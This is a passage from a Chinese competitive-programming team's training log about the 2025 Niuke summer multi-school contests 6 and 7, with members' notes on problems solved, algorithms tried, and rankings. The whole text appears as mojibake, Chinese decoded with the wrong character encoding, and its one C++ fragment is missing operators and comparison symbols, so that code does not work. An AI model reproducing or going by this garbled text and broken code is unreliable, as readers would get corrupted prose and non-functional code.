DPã€‚ç”±äºç©ºæœºæ—¶é—´æ¯”è¾ƒä¹…äº†ï¼Œå°±æ²¡æœ‰è¿›ä¸€æ­¥ç¡®è®¤ç›´æ¥å¼€å†™ï¼Œä»–ä¿©å»çœ‹äº†åˆ«çš„é¢˜ç›®ã€‚ è®¾ $f_{i,0/1,0/1}$ è¡¨ç¤ºè€ƒè™‘äºŒè¿›åˆ¶ä¸‹ä»ä½å¾€é«˜çš„ç¬¬ $i$ ä½ä¸º $0/1$ æ—¶ï¼Œä¹‹å‰ä½ç½®ä¸Š $1$ å‡ºç°äº†å¶æ•°/å¥‡æ•°æ¬¡çš„æ•°çš„ä¸ªæ•°ã€‚ç”±äºå¼‚æˆ–ï¼Œæ˜¾ç„¶ç¬¬ $i$ ä½ä¸Šçš„æ•°è¦å¥‡å¶ä¸åŒï¼Œåˆç”±äºåªæœ‰ä»ä½åˆ°é«˜çš„ç¬¬å¥‡æ•°ä¸ª $1$ æ‰èƒ½æœ‰è´¡çŒ®ï¼Œå› æ­¤ $f_{i,0,1},f_{i,1,1}$ ä¸ $f_{i,0,0},f_{i,1,0}$ è¿™ä¸¤å¯¹æ•°ä¼šäº§ç”Ÿè´¡çŒ®ã€‚ for (int j = 1;j = n;++j) ++f[a[j] i 1][st[j]]; st[j] ^= a[j] i 1;ans += 1ll * (1ll i) * (f[0][0] * f[1][0] + f[1][1] * f[0][1]); ç”±äºæ²¡æœ‰ç¡®è®¤è¿‡åšæ³•ï¼Œåœ¨äº¤ä¹‹å‰èŠ± 5 min å†™äº†ä¸ªæš´åŠ›å¯¹æ‹ã€‚å¹¸å¥½æ²¡æœ‰æ‹å‡ºé”™ï¼Œæäº¤ä¸€é ACã€‚ ã€Sky Zlwã€‘ E æ²¡æ€è·¯ï¼ŒScy å†™å®Œç­¾åˆ°è¿‡æ¥ç§’äº†ï¼Œé‚ä¸ Sky è®¨è®º Jã€‚é¢˜ç›®å¤§æ„å¦‚ä¸‹ï¼š ç»™å®šä¸€ä¸ª $\\texttt{01}$ ç½‘æ ¼ï¼Œ$\\texttt{1}$ æ¯ç§’å‘ä¸Šä¸‹å·¦å³æŸ“è‰²ï¼Œå¯ä»¥ç»™ä¸€ä¸ª $\\texttt{0}$ å˜æˆ $\\texttt{1}$ï¼Œä½¿å¾—æ€»æŸ“è‰²æ—¶é—´æœ€å°ã€‚ Sky ä¸€å¼€å§‹çš„æƒ³æ³•æ˜¯å–æœ€è¿œç‚¹çš„â€œä¸­å¿ƒâ€ï¼Œå°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªç‚¹ï¼Œè·ç¦»æ‰€æœ‰ç‚¹æ›¼å“ˆé¡¿è·ç¦»æœ€å¤§å€¼æœ€å°ã€‚å…·ä½“æ¥è¯´ï¼Œå…ˆä¸ç®¡è¿™ä¸ªå˜æˆ $\\texttt{1}$ çš„æ ¼å­ï¼Œè€ƒè™‘ç›´æ¥ bfs æ¨¡æ‹Ÿä¸€éæŸ“è‰²è¿‡ç¨‹ï¼Œæ ‡å‡ºæ‰€æœ‰æ ¼å­çš„æœ€çŸ­æ—¶é—´ï¼Œç„¶åå»æ€è€ƒæ€ä¹ˆå°†æœ€å¤§æ—¶é—´é‚£å‡ ä¸ªæ ¼å­æ—©ç‚¹æŸ“è‰²ã€‚è€ƒè™‘ç›´æ¥å–å‡ ä¸ªæœ€å¤§æ—¶é—´æ ¼å­çš„æ›¼å“ˆé¡¿è·ç¦»ä¸­å¿ƒï¼Œå³æ‰¾å‡ºä¸€ä¸ªæ ¼å­ï¼Œä½¿å¾—å…¶åˆ°å‡ ä¸ªæœ€å¤§æ—¶é—´æ ¼å­çš„æ›¼å“ˆé¡¿è·ç¦»çš„æœ€å¤§å€¼æœ€å°ã€‚å³ï¼š (x,y) = \\arg \\min_{(x, y) \\in I} (\\max_{i \\in M} (\\lvert x-x_i \\rvert + \\lvert y-y_i \\rvert))å…¶ä¸­ï¼Œ$I$ æ˜¯åæ ‡èŒƒå›´ï¼Œ$M$ æ˜¯æœ€å¤§æ—¶é—´æ ¼å­çš„ç¼–å·é›†åˆã€‚ ä½†è¿™æ ·ä¸å¤ªå¥½è¯æ˜æ­£ç¡®æ€§ï¼Œä¸”æ±‚å–ä¸­å¿ƒéœ€è¦åˆ† $4$ ä¸ªè±¡é™åˆ†ç±»è®¨è®ºå¼‚å¸¸éº»çƒ¦ã€‚è€Œä¸”ç›´æ¥è¿™æ ·åšçš„å¤æ‚åº¦æ˜¯ $O((nm)^2)$ï¼Œä¸ç†æƒ³ã€‚Zlw æå‡ºå¯ä»¥äºŒåˆ†è·ç¦»ï¼Œä¿è¯æ­£ç¡®æ€§ï¼Œä½† Sky è®¤ä¸ºå¤ªå¤æ‚ï¼Œäºæ˜¯å…ˆå°è¯•å¦‚ä½•é¿å…åˆ†ç±»è®¨è®ºæˆ–è€…æ›´å¤æ‚çš„æ“ä½œã€‚ç„¶åå‘ç°å¯ä»¥é•œåƒç¿»è½¬æŠŠ $4$ ä¸ªè±¡é™ç»Ÿä¸€åˆ°å·¦ä¸Šè§’æ±‚å–ã€‚è¿™ä¸ªæ—¶å€™ Scy å·²ç»å†™å®Œé¢˜ï¼Œå¤„äºç©ºæœºçŠ¶æ€ï¼Œé‚ä¼˜å…ˆæ­£ç¡®æ€§å†™äº†äºŒåˆ†ï¼Œç”±äºæ²¡ç‰¹åˆ¤å…¨ $0$ å’Œæ•°ç»„æ¸…ç©ºä¸å…¨ WA äº†ä¸¤å‘ã€‚èµ›åçœ‹ç¾¤é‡Œå‘ç°è¿™ä¸ª case ä¹Ÿæœ‰å¾ˆå¤šçš„é˜Ÿä¼è¢«å¡ï¼ˆä¼šæ˜¾ç¤ºç”¨ä¾‹é€šè¿‡ç‡ $98.78\\%$ï¼‰ã€‚ ã€Scyã€‘A é¢˜çœ‹äº†å¾ˆä¹…ï¼Œå°è¯•æ¨äº†ä¸€ä¸‹å¼å­ã€‚$s - t = \\sum (k - 2p_i)$ï¼Œå…¶ä¸­ $p_i$ è¡¨ç¤ºæ¯æ¬¡é€‰æ‹©æœä¸Šçš„ç¡¬å¸çš„ä¸ªæ•°ã€‚æ˜¾ç„¶ $s - t$ æ˜¯å¥‡æ•°ä¸” $k$ æ˜¯å¶æ•°æ—¶æ— è§£ã€‚åˆéœ€è¦æ»¡è¶³æ¯æ¬¡ $p_i \\in [s^\\prime + k - n,s^\\prime]$ï¼Œå…¶ä¸­ $s^\\prime$ ä¸ºå½“å‰æœä¸Šç¡¬å¸çš„ä¸ªæ•°ã€‚è¿˜å‘ç° $n = k$ æ—¶æ˜¯ç‰¹æ®Šçš„ï¼Œåªæœ‰ $s + t = n$ æ—¶ç­”æ¡ˆä¸º $1$ï¼Œå¦åˆ™æ— è§£ã€‚ä½†æ˜¯æ¥ä¸‹å»ä¸€ç›´ä¸çŸ¥é“å¦‚ä½•å¤„ç†æ¯æ¬¡ $p_i$ çš„å–å€¼ï¼Œçœ‹æ•°æ®èŒƒå›´å¾ˆåƒæ˜¯ç»“è®ºé¢˜ï¼Œä½†æ˜¯æ‰¾ä¸åˆ°è§„å¾‹ï¼Œæ²¡æ³•è¿›ä¸€æ­¥æ¨è¿›ã€‚ï¼ˆåç‰¢ä¸­ï¼‰ ã€Zlwã€‘ K æœ´ç´  dp æ˜¯ $O(k2^m)$ ï¼Œç„¶åå°è¯•äº†ä»æ ‘å½¢ç»“æ„å‡ºå‘æ ‘å½¢ dpï¼Œä½†ä»ç„¶éå¸¸å¤æ‚ä¸ç¡®å®šæ­£ç¡®æ€§ï¼Œä¸”æ—¶é—´å¤æ‚åº¦çº¦ä¸º $O(m^2 2^m)$ ä¸å¤ªèƒ½å¤Ÿé€šè¿‡ã€‚ç»§ç»­è§‚å¯Ÿå‘ç°æœ¬è´¨ä¸åŒçš„é“¾æ•°åªæœ‰ $O(m^2)$ ï¼Œæœ‰äº†ä¸€ä¸ªå¥½å†™çš„ $O(m^2 2^m)$ çš„å†™æ³•ï¼Œå› ä¸ºç©ºæœºé‚å†™äº†ä¸€ä¸‹ï¼Œä¸è´Ÿä¼—æœ›çš„ TLE äº†ã€‚ ã€Scyã€‘åœ¨ Zlw çš„ $O(m^2 2^m)$ çš„åŸºç¡€ä¸Šï¼Œæˆ‘æƒ³åˆ°å¯ä»¥åˆ©ç”¨ fwt å’Œå®¹æ–¥æ¥è®¡ç®—ç­”æ¡ˆï¼Œæ—¶é—´å¤æ‚åº¦å¯ä»¥ä¼˜åŒ–åˆ° $O(m 2^m)$ã€‚è¿™æ—¶å€™éœ€è¦ç®—ç»„åˆæ•°ï¼Œè¿™æ°å¥½å’Œé¢˜ç›®é‡Œçš„æ•°å­—åœ¨æ¨¡ $998244353$ ä¸Šé $0$ å¯¹åº”äº†èµ·æ¥ã€‚Zlw ä½¬çš„ä»£ç å’Œæˆ‘çš„ä»£ç ä¸å¤ªèƒ½å…¼å®¹ï¼Œäºæ˜¯ç›´æ¥é‡å†™ã€‚ ç›´æ¥é€‰æ‹©åˆ©ç”¨ dfs æ ‘çš„æ€§è´¨æ¥æ±‚å‡ºä¸€æ¡è·¯å¾„æ˜¯å¦ç»è¿‡ç¬¬ $i$ æ¡å…³é”®è¾¹ï¼ˆè¿™é‡Œéœ€è¦æ³¨æ„æ˜¯ç”¨æ·±åº¦å¤§çš„ç»“ç‚¹å»åˆ¤æ–­ï¼ï¼å½“æ—¶è¿™é‡Œè¿˜è°ƒè¯•äº†å¾ˆä¹…ï¼‰ï¼Œç„¶åç›´æ¥æ”¾åˆ°çŠ¶æ€é‡Œï¼Œè¿›è¡Œ sosdpï¼Œå¾—åˆ° $g_S$ï¼Œè¡¨ç¤ºçŠ¶æ€ä¸º $S$ çš„å­é›†çš„è·¯å¾„æ¡æ•°ã€‚ç„¶åæšä¸¾ç­”æ¡ˆï¼Œå°è¯•ç”¨ $i$ æ¡è¾¹å»è¦†ç›–è¿™ $m$ ä¸ªå…³é”®ç‚¹ã€‚ç”¨å®¹æ–¥å°±èƒ½ç®—å‡ºç­”æ¡ˆï¼Œå³ $tot = \\sum \\limits _{i = 0}^{2^m - 1} (-1) ^ {[(m - \\operatorname{popcount}(i)) \\bmod 2 = 1]} \\times \\binom {g_i}{i}$ã€‚æ‰¾åˆ°ç¬¬ä¸€ä¸ªä½¿ $tot$ éé›¶çš„ $i$ å°±å¯ä»¥ç›´æ¥è¾“å‡ºï¼Œå¦åˆ™æ— è§£ã€‚ç´§èµ¶æ…¢èµ¶ç»ˆäºåœ¨ $04:45$ çš„æ—¶å€™é€šè¿‡ã€‚ ã€Scyã€‘æœ€ç»ˆ $4$ é¢˜é—æ†¾ç¦»åœºäº†ã€‚ä¸è¿‡å¥½åƒæ’åè¿˜è¡Œï¼Œè¿˜æ˜¯ä¸Šåˆ†äº†ï¼ ã€Skyã€‘ä»Šå¤©è¿™åœºå¾ˆå²ï¼Œæˆ‘ä¹Ÿå¾ˆæ‘¸ï¼Œè¢«é˜Ÿå‹å¸¦é£ğŸ˜­ã€‚ 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥6 ã€çœæµç‰ˆã€‘å¼€å±€ç­¾ä¸ä¸Šåˆ°ï¼Œæ¦œæ­ªå¾—å¾ˆï¼Œå¯¼è‡´æœ€åæ²¡æ¥å¾—åŠè¿‡ $B$ã€‚$5/13$ é¢˜ï¼Œ$\\texttt{rank 156/1437}$ã€‚ ã€Scyã€‘å¼€å±€çœ‹ Cï¼Œ$f(p)$ æ˜¯å¥½æ±‚çš„ï¼Œå°±æ˜¯ç¬¬ä¸€ç±»æ–¯ç‰¹æ—æ•°ï¼Œä½†æ˜¯ä¸‰æ¬¡æ–¹æ²¡æƒ³æ³•ï¼Œæ‰“äº†è¡¨ä¹Ÿæ²¡å‘ç°ä»€ä¹ˆè§„å¾‹ã€‚ä½†è¿™æ—¶å€™ Zlw çš„ K æœ‰äº†æƒ³æ³•ï¼Œäºæ˜¯å…ˆè®©ä»–æ¥å†™ã€‚ ã€Zlwã€‘å…¶å®ä¸€å¼€å§‹çœ‹çš„å°±æ˜¯ M è¿™é“é¢˜ï¼Œå¹¶ä¸”å¾ˆå¿«çš„è·Ÿ Sky è®¨è®ºå‡ºæ­£è§£ã€‚ä½†æ˜¯å¹¶æ²¡æœ‰ä¸¥æ ¼çš„è¯æ˜æ­£ç¡®æ€§ä¸”å½“æ—¶æ²¡äººè¿‡ï¼Œäºæ˜¯çœ‹å…¶å®ƒç­¾åˆ°é¢˜å»äº†ã€‚$n$ ä¸ºå¥‡æ•°æ—¶å®¹æ˜“æ„é€ ï¼Œä¸ºå¶æ•°æ—¶éœ€è¦æ‰¾åˆ°æœ€ç›¸è¿‘çš„ä¸¤ä¸ªæ•°å¡«åˆ°æœ€é«˜ä½ï¼Œå‰©ä¸‹çš„æ„é€ æ–¹æ¡ˆå›ºå®šã€‚ç†è®ºä¸Šåªè¦æ‰¾åˆ°æœ€ä¼˜çš„æœ€é«˜ä½å³å¯ã€‚å½“æ—¶å‘ç°å¯ä»¥æ‰¾åˆ°æœ€é è¿‘ä¸­å¿ƒçš„æœ€ä¼˜æœ€é«˜ä½ï¼Œç„¶åç›´æ¥ç¡®å®šæˆ–è€…è¿›è¡Œä¸€æ¬¡ $O(n)$ çš„æ¯”è¾ƒã€‚ä½†æ˜¯ç»è¿‡ä¸€ç³»åˆ—è«åå¥‡å¦™çš„æ“ä½œå’Œä¸¥é‡æ­ªæ‰çš„æ¦œï¼Œæˆ‘ä»¬å¿˜è®°äº†è¿™é“é¢˜ã€‚ ã€Zlwã€‘K çœ‹åˆ°æ•´ä½“åŠ å†å– $\\gcd$ï¼Œæƒ³åˆ°ç»å…¸å·®åˆ†ï¼Œå˜æˆäº†å–å‰åç¼€åŸæ•°ç»„ä»¥åŠä¸­é—´å·®åˆ†æ•°ç»„çš„ $\\gcd$ã€‚ ç„¶ååˆæƒ³åˆ°ç»å…¸å‰/åç¼€ $\\gcd$ å˜æ¢æ¬¡æ•°ä¸º $O(\\log)$ ï¼Œäºæ˜¯æš´åŠ›æšä¸¾å‰åç¼€ä¸åŒå€¼ï¼Œè´ªå¿ƒé€‰å–ä½¿ä¸­é—´åŒºé—´æœ€å°çš„æƒ…å†µï¼Œå†é…ä¸€ä¸ªstè¡¨æŸ¥è¯¢å³å¯ã€‚è¿™éƒ¨åˆ†å¤æ‚åº¦ $O(\\log^2 w)$ å®Œå…¨å¯ä»¥æ¥å—ã€‚ ã€Scy Skyã€‘Scy å’Œ Sky æ‰¾è§„å¾‹ï¼Œæå‡ºäº†ä¸€ä¸ª $f_{i+1,j}=f_{i,j}\\times i+f_{i,j-1}$ï¼Œç„¶å Zlw è®¾ $f_i$ çš„ $\\rm OGF$ ä¸º$F_{i}$ï¼Œ$F_{i+1}=xF_{i}+iF_i=(x+i)F_{i}$ï¼Œå‘ç°$F_n=\\prod_{i=1}^{n-1}(x+i)$ï¼Œäºæ˜¯é¼“åŠ± Scy ç”¨åˆ†æ²»+ FFT ä½†å¹¶æœªè¢«é‡‡çº³ï¼ˆæƒ³ğŸ‘ï¼‰ã€‚ ã€Zlw Skyã€‘L é¢˜çš„é¢˜ç›®å¤§æ„æ˜¯ç»™å®š $m$ ä¸ªåŒºé—´ï¼Œæ±‚é•¿ä¸º $2n$ çš„å­—å…¸åºæœ€å°çš„åˆæ³•æ‹¬å·ä¸²ï¼Œæ»¡è¶³æ¯ä¸ªåŒºé—´å†…è‡³å°‘æœ‰ä¸€ä¸ªå·¦æ‹¬å·ã€‚è‹¥æ— è§£ï¼Œåˆ™è¾“å‡º $-1$ã€‚ è€ƒè™‘æ²¡æœ‰çº¦æŸçš„è¯ï¼Œå­—å…¸åºæœ€å°å°±æ˜¯ $\\texttt{(((â€¦)))}$ è¿™æ ·çš„å½¢å¼ï¼Œç„¶åå…ˆæŠŠæœ‰åŒ…å«çš„åŒºé—´åˆ æ‰å¤§çš„ï¼Œå†æ ¹æ®åŒºé—´ä»å³å¾€å·¦è´ªå¿ƒï¼ŒæŠŠæ¯ä¸ªåŒºé—´æœ€å·¦è¾¹çš„å³æ‹¬å·æ¢æˆå·¦æ‹¬å·ã€‚ æ„é€ /è´ªå¿ƒé¢˜ Zlw ä¸å¤ªæ“…é•¿ï¼Œä½†æ˜¯ Scy åœ¨å†™å¿™ï¼Œåœºä¸Šæ­¤æ—¶çœ‹èµ·æ¥ä¹Ÿåªæœ‰è¿™é¢˜å¯åšã€‚åœ¨ Sky çš„å¸®åŠ©ä¸‹æ…¢æ…¢ç¡®å®šäº†äº¤æ¢æœ€å³ä¾§å·¦æ‹¬å·çš„ç­–ç•¥ã€‚ä½†æ˜¯ç»†èŠ‚æ¯”è¾ƒå¤šï¼Œå†™æŒ‚äº†ï¼ŒWA äº†å¥½å‡ æ¬¡ã€‚è¿™ä¸ªæ—¶å€™æœ‰ç‚¹çº¢æ¸©ï¼Œå¤§æ¦‚èƒ½ç¡®å®šæ˜¯ WA åœ¨äº¤æ¢æ‹¬å·çš„ç»†èŠ‚ä¸Šäº†ã€‚åé¢æƒ³äº†æƒ³ï¼Œå¯ä»¥å…ˆè´ªå¿ƒçš„å¡«å¿…å¡«çš„å·¦æ‹¬å·ï¼Œå†è¡¥å…¨å‰©ä¸‹çš„å°±å¯ä»¥ã€‚é‡æ„äº†ä¸€ä¸‹è¿‡äº†ã€‚ ã€Scyã€‘æˆ‘æŒ‰ç…§ Zlw ç»™çš„å¤šé¡¹å¼çš„æƒ³æ³•ï¼Œå°±æ˜¯ $f(x) = x(x + 1)\\cdots(x + n)$ çš„ç³»æ•°å°±æ˜¯å…·ä½“çš„ç­”æ¡ˆï¼Œç„¶åæŒ‰ç…§è¿™ä¸ªå¼å­å‡ºå‘ï¼Œ$F(x) = x \\times (x^k)^\\prime = kx^k$ï¼Œå› æ­¤ $F^3(x)$ å¯ä»¥æŠŠ $k^3$ çš„ç³»æ•°æå‡ºæ¥ã€‚ä¹‹åç»è¿‡ä¸€ç³»åˆ—å¤æ‚çš„æ±‚å¯¼ä¹‹åï¼Œå¤§æ¦‚è¿‡äº† 2h æ‰é€šè¿‡æ­¤é¢˜ã€‚ *èµ›åçœ‹é¢˜è§£ä»¥åçš„åšæ³•ï¼š è®¾ $I_i$ è¡¨ç¤ºå…ƒç´  $i$ æ˜¯å¦åœ¨æ ˆå†…ï¼Œä¹Ÿå°±æ˜¯ I_i = \\begin{cases} 1 & \\text{if } i \\text{ is in the stack}, \\\\ 0 & \\text{otherwise}. \\end{cases}æŠŠç«‹æ–¹çœ‹æˆé€‰ä¸‰ä¸ªé¡¹ç›¸ä¹˜ï¼Œäºæ˜¯æœ‰ f^3(p) = \\sum\\limits_{i} I^3_i + 3\\sum\\limits_{i eq j} I^2_iI_j + 6\\sum\\limits_{i < j < k}I_iI_jI_k \\\\ = \\sum\\limits_{i} I_i + 6\\sum\\limits_{i < j} I_iI_j + 6\\sum\\limits_{i < j < k}I_iI_jI_kè€ƒè™‘å•ä¸ªå…ƒç´  $i$ åœ¨æ ˆä¸­ï¼Œåˆ™ $1 \\sim i - 1$ éœ€è¦åœ¨ $i$ å‰é¢ï¼Œå…± $(i - 1)!$ ç§ï¼Œè€Œ $i + 1 \\sim n$ éšæ„æ”¾ç½®ï¼Œå…± $\\frac{n!}{i!}$ ç§ï¼Œå› æ­¤å…±æœ‰ $\\frac{n!}{i}$ ç§ã€‚åŒç†å¾—åˆ°åŒå…ƒç´ å’Œä¸‰å…ƒç´ çš„æ–¹æ¡ˆæ•°ä¸º $\\frac{n!}{ij}$ ä¸ $\\frac{n!}{ijk}$ã€‚é¢„å¤„ç†å¼å­å³å¯ $O(1)$ æ±‚å‡ºã€‚ ã€Scyã€‘D æ³¨æ„åˆ°å•ç»„æ•°æ®ï¼Œç„¶åçœ‹ $455$ åªæœ‰ $\\binom {15}{3}$ æˆ– $\\binom{15}{12}$ èƒ½å‡‘å‡ºæ¥ï¼Œæ‰€ä»¥å¾€ç»„åˆæ•°ä¸Šé ã€‚è½¬æ¢äº†ä¸€ä¸‹é¢˜æ„ï¼Œå¯¹äºæŸä¸€è¡Œï¼Œå¡«çš„æ•°å•è°ƒä¸é™ï¼›å¯¹äºæŸä¸€åˆ—ï¼Œå¡«çš„æ•°å•è°ƒä¸å¢ã€‚ç„¶åä¸€ä¸‹å­æ²¡ä»€ä¹ˆæƒ³æ³•ï¼Œäºæ˜¯å¼€å§‹å°è¯•å‡‘å¼å­ï¼Œå‡‘äº† $\\dbinom {(n + 1)m}{m}$ï¼Œå‘ç°å¤§æ ·ä¾‹è¿‡ä¸äº†ã€‚åˆæƒ³åˆ°å¯ä»¥ $\\dbinom{n(n - 1) + m}{m}$ï¼Œç„¶åæƒŠå–œåœ°å‘ç°å¯¹äº†ï¼Œäºæ˜¯æœæ–­æäº¤è¿‡é¢˜ï¼ *èµ›åçœ‹è®¨è®ºï¼Œå‘ç°ç¬¬ä¸€æ­¥çš„è½¬æ¢æ­£ç¡®ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šï¼Œæ¯å¡«å‡ºä¸€ä¸ªæ•°ï¼Œå°±ç›¸å½“äºä¼šå¯¹å³ä¸‹è§’çš„çŸ©å½¢äº§ç”Ÿè´¡çŒ®ã€‚ç”±äºå³ä¸‹è§’çš„æ•°ä¸è¶…è¿‡ $m$ï¼Œå› æ­¤å¯ä»¥è¿›ä¸€æ­¥è½¬æ¢ä¸ºæ”¾å°çƒé—®é¢˜ï¼Œåœ¨ $n(n - 1)$ ä¸ªç›’å­ä¸­æ”¾ä¸è¶…è¿‡ $m$ ä¸ªå°çƒï¼Œç­”æ¡ˆå°±æ˜¯ $\\dbinom{n(n - 1) + m}{m}$ã€‚ ã€Zlwã€‘ä¸­é—´è¾—è½¬äº†å¥½å‡ é¢˜ï¼Œéƒ½æœ‰ç‚¹åƒæ•°æ®ç»“æ„ã€‚Sky çœ‹äº† E æŠŠæˆ‘å–Šè¿‡æ¥è¯´è¿™é¢˜æ˜¯å¾ˆæ˜æ˜¾çš„æ•°æ®ç»“æ„ã€‚æƒ³äº†ä¸€ä¼šæ²¡å•¥æ˜ç¡®çš„æ€è·¯ï¼Œä¸è¿‡çœ‹åˆ° $10^5$ çš„æ•°æ®èŒƒå›´å’Œéå¸¸éš¾ç»´æŠ¤çš„ $p$ æ˜ å°„ï¼Œå¤§æ¦‚èƒ½çŒœåˆ°æ˜¯åˆ†å—ã€‚è¿™ä¸ªæ—¶å€™ Sky é†’è¯´æ˜¯å¡äº† $64 \\rm MB$ çš„ç©ºé—´ã€‚è¿™ä¸ªæ—¶å€™å¤§æ¦‚èƒ½çŒœåˆ°æ˜¯å¡ $O(n\\sqrt n)$ çš„ç©ºé—´ï¼Œæ›´åŠ ç¡®å®šæ˜¯åˆ†å—ã€‚ç„¶åèƒ½å‘ç°æ•´å—çš„è´¡çŒ®ä¸å—å†… $p\\in [l,r]$ çš„æ•°é‡æœ‰å…³ï¼Œå¯ä»¥ç›´æ¥ä¹˜ã€‚äºæ˜¯æƒ³åˆ°å¯ä»¥å—å†… $p$ æ’åºç„¶åäºŒåˆ†å¾—åˆ°ï¼Œç„¶åæ•£å—æ˜¯åŒºé—´å’Œå•ç‚¹æŸ¥ï¼Œä¹Ÿå¾ˆå¥½ç»´æŠ¤ã€‚ä½†æ˜¯æ­¤æ—¶å¤æ‚åº¦ $O(n\\sqrt n \\log n)$ å¹¶ä¸” $O(\\log n)$ éš¾ä»¥å¡è¿›æ ¹å·å†…éƒ¨ã€‚æƒ³åˆ°åˆ†å—å¹³è¡¡å¤æ‚åº¦ï¼Œäºæ˜¯å†å¼€ä¸€ä¸ªåˆ†å—æ•°ç»„å®ç° $O(\\sqrt n)-O(1)$ çš„åŒºé—´åŠ å•ç‚¹æŸ¥ã€‚ç„¶åæƒ³åˆ°ä¸Šé¢å¦‚æœå¼€ $O(n\\sqrt n)$ çš„å‰ç¼€å’Œæ•°ç»„ä¹Ÿå¯ä»¥åšåˆ°ä¸¥æ ¼ $O(n\\sqrt n)$ï¼Œè°ƒäº†è°ƒå—é•¿å†æŠŠ int æ”¹æˆ short å‘ç°ç©ºé—´è¿˜æ˜¯ç•™æœ‰ä½™åœ°çš„ã€‚äºæ˜¯å¾ˆå¿«å†™å®Œã€‚ ã€Sky Zlwã€‘Zlw æµ…æµ…çœ‹äº† Bã€‚æ˜¯ä¸ªå¥‡å¦™äºŒåˆ†ï¼Œä¸€å¼€å§‹å»ç®—å¥‡æ€ªçš„é™åˆ¶ WA äº†ï¼Œç„¶å Sky è¯´æœ‰æ€è·¯å°±äº¤ç»™ä»–äº†ã€‚ï¼ˆæ‘†ï¼‰ è§‚å¯Ÿå‘ç°ï¼Œå¯¹äºä¸¤ä¸ªæ•° $s1s2$ï¼Œå¦‚æœè¿›åˆ¶æ“ä½œé‡Œæ²¡æœ‰ç›´æ¥è½¬æ¢æˆä¸€ä¸ªæ•°ï¼ˆè¿›åˆ¶ä½†æ˜¯ $0$ æ¬¡æ–¹ï¼‰çš„è¯ï¼Œç›¸å½“äºæ˜¯åªæœ‰åŠ æ³•ä¹˜æ³•æ“ä½œï¼Œå¾—åˆ°çš„ç­”æ¡ˆè‚¯å®šæœ‰ $s1^\\primes2^\\prime$ï¼Œå¦‚æœæœ‰ç›´æ¥è½¬æ¢æˆä¸€ä¸ªæ•°çš„è¯ï¼Œå¾—åˆ°çš„å°±æ˜¯ $s1^\\prime=s2^\\prime$ï¼Œæ•´åˆèµ·æ¥å°±æ˜¯ $s1^\\prime\\leq s2^\\prime$ï¼Œå½“ç„¶è¿™é‡Œå‰æéƒ½æ˜¯åˆæ³•è¿›åˆ¶è½¬æ¢ã€‚ ç›´æ¥è€ƒè™‘ä»$[2,M]$äºŒåˆ†ç­”æ¡ˆï¼Œå¯¹äºä¸€ä¸ª $mid$ï¼Œåªéœ€è¦ç›´æ¥æ¨¡æ‹Ÿå®ƒèƒ½ä¸èƒ½å®Œæˆè¿›åˆ¶è½¬æ¢å³å¯ã€‚æˆ‘ä»¬å¯ä»¥å…ˆäºŒåˆ†ä¸€ä¸ªç»“æœä¸å°äº $y$ çš„ç­”æ¡ˆï¼Œç„¶åå†äºŒåˆ†ç¬¬ä¸€ä¸ªç»“æœå¤§äº $y$ çš„ $ans_r$ï¼Œé‚£ä¹ˆç­”æ¡ˆå°±æ˜¯ $ans_l$ï¼Œ$ans_r - 1$ã€‚æ—¶é—´å¤æ‚åº¦ $O(\\log M \\sum l_i)$ã€‚ é¢˜ç›®çœŸçš„ä¸éš¾ï¼Œä½†æ¯”èµ›å‰æœŸä¸­æœŸæ ¹æœ¬æ²¡äººåšè¿™é¢˜ï¼Œæ¦œéƒ½ä¸çŸ¥é“æ­ªåˆ°å“ªé‡Œå»äº†ï¼Œç›´åˆ°æœ€åä¸€å°æ—¶æ‰å‘ç°è¿‡è¿™é“é¢˜çš„äººè¶Šæ¥è¶Šå¤šï¼Œä½†æœ€åæ—¶é—´ä¸å¤Ÿæ²¡æœ‰è°ƒå‡ºæ¥ã€‚ ã€Scyã®è¡¥é¢˜ã€‘ G é¢˜æ²¡å¾€ dp ä¸Šæƒ³ã€‚è®¾ $dp_i$ æ¥è¡¨ç¤º $\\texttt{L}$ çš„å¤ä½æ—¶é—´ï¼Œå†è®¾ $g_i$ è¡¨ç¤º $[1,i]$ ä¸­ $\\texttt{R}$ çš„ä¸ªæ•°ã€‚ç”±äº $\\texttt{LLâ€¦}$ çš„æƒ…å†µä¼šé€ æˆæ’é˜Ÿæ•ˆåº”ï¼Œäºæ˜¯æœ‰è¡¨è¾¾å¼ $dp_i = \\max (dp_{i - 1},g_i)$ã€‚ä¸éš¾æƒ³åˆ°å¯ä»¥ç”¨ ddp æ¥ç»´æŠ¤ $\\max+$ çŸ©é˜µã€‚ å…·ä½“æ¥è¯´ï¼Œè‹¥å½“å‰ä¸º $\\texttt{L}$ï¼Œåˆ™çŸ©é˜µå¯ä»¥æè¿°ä¸º \\begin{bmatrix} 1 & -\\infty \\\\ 0 & 0 \\end{bmatrix}è‹¥å½“å‰ä¸º $\\texttt{R}$ï¼Œåˆ™çŸ©é˜µå¯ä»¥æè¿°ä¸º \\begin{bmatrix} 0 & -\\infty \\\\ -\\infty & 1 \\end{bmatrix}æœ€åçš„æ—¶é—´å¤æ‚åº¦ä¸º $O(n + q \\log n)$ã€‚ 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥7 ã€çœæµç‰ˆã€‘ $5/10$ é¢˜ï¼Œ$\\texttt{rank 224/1501}$ï¼Œä¸‹åˆ†äº† qwqã€‚ ã€Scyã€‘å‘ç° C æ˜¯ç­¾åˆ°ï¼Œå‘ç°åªè¦ç»´æŠ¤å½“å‰æœ€å¤§å€¼ä¸å…ƒç´ å·®ä¹‹å’Œå³å¯ï¼Œç›´æ¥å¼€å†™ï¼Œä¸€å‘é€šè¿‡ã€‚ ã€Scyã€‘ç»§ç»­çœ‹äº† Fï¼Œæ²¡å•¥æƒ³æ³•ã€‚çŒœäº†ä¸ªæ¯æ¬¡å‡å» $\\lfloor\\frac{\\text{average}}{n}\\rfloor$ çš„æš´åŠ›å‘ç°æœ€å $0$ å’Œ $1$ å‡ºç°çš„å¼‚å¸¸å¤šï¼Œä½†æ˜¯æ­¤æ—¶è¿˜æ²¡æƒ³åˆ°ç»“è®ºã€‚è¿™æ—¶å€™ï¼ŒZlw çªç„¶ç‚¹å‡ºç­”æ¡ˆå¯èƒ½å°±æ˜¯å¥‡æ•°ä¸ªæ•°ä¸å¶æ•°ä¸ªæ•°çš„ä¹˜ç§¯ã€‚ $\\texttt{12:39:17}$ ç¬¬ä¸€å‘æäº¤ï¼ŒWAï¼ 